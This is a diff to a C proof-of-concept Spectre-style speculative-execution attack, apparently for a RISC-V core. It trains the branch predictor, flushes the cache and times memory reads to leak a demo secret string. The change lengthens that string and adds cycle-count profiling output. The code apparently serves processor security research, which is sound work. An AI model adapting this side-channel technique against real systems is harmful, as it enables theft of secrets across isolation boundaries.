@@ -6,7 +6,7 @@
 #define TRAIN_TIMES 6 // assumption is that you have a 2 bit counter in the predictor
 #define ROUNDS 1 // run the train + attack sequence X amount of times (for redundancy)
 #define ATTACK_SAME_ROUNDS 10 // amount of times to attack the same index
-#define SECRET_SZ 26
+#define SECRET_SZ 29
 #define CACHE_HIT_THRESHOLD 50
 
 uint64_t array1_sz = 16;
@@ -14,7 +14,7 @@ uint8_t unused1[64];
 uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
 uint8_t unused2[64];
 uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
-char* secretString = "!\"#ThisIsTheBabyBoomerTest";
+char* secretString = "OMG!\"#ThisIsTheBabyBoomerTest";
 
 /**
  * reads in inArray array (and corresponding size) and outIdxArrays top two idx's (and their
@@ -77,11 +77,14 @@ void victimFunc(uint64_t idx){
 int main(void){
     uint64_t attackIdx = (uint64_t)(secretString - (char*)array1);
     uint64_t start, diff, passInIdx, randIdx;
+    uint64_t profile_start, profile_diff;
     uint8_t dummy = 0;
     static uint64_t results[256];
 
     // try to read out the secret
     for(uint64_t len = 0; len < SECRET_SZ; ++len){
+
+        profile_start = rdcycle();
 
         // clear results every round
         for(uint64_t cIdx = 0; cIdx < 256; ++cIdx){
@@ -90,6 +93,7 @@ int main(void){
 
         // run the attack on the same idx ATTACK_SAME_ROUNDS times
         for(uint64_t atkRound = 0; atkRound < ATTACK_SAME_ROUNDS; ++atkRound){
+
 
             // make sure array you read from is not in the cache
             flushCache((uint64_t)array2, sizeof(array2));
@@ -123,7 +127,15 @@ int main(void){
                     results[i] += 1;
                 }
             }
+        
+            //profile_diff = rdcycle() - profile_start;
+            //printf("Read time: (byteIdx, atkRnd, cycle) (%lu, %lu, %lu)\n", len, atkRound, profile_diff);
+            //printf("Read time: (byteIdx, cycle) (%lu, %lu)\n", len, profile_diff);
         }
+
+        profile_diff = rdcycle() - profile_start;
+        //printf("Read time: (byteIdx, atkRnd, cycle) (%lu, %lu, %lu)\n", len, atkRound, profile_diff);
+        printf("Read time: (byteIdx, cycle) (%lu, %lu)\n", len, profile_diff);
         
         // get highest and second highest result hit values
         uint8_t output[2];
